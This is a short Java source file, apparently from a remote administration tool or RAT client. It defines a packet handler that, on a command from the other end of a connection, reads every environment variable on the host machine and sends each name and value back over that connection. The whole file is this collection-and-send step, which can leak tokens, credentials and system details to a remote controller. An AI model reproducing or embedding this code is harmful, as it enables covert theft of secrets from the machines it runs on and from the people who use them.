package com.redpois0n.packets.in;

import java.util.Set;

import com.redpois0n.Connection;


public class PacketVAR extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Set<String> set = System.getenv().keySet();
		for (String str : set) {
			Connection.writeLine("VARPROP");
			Connection.writeLine(str);
			Connection.writeLine(System.getenv(str));
		}
	}

}
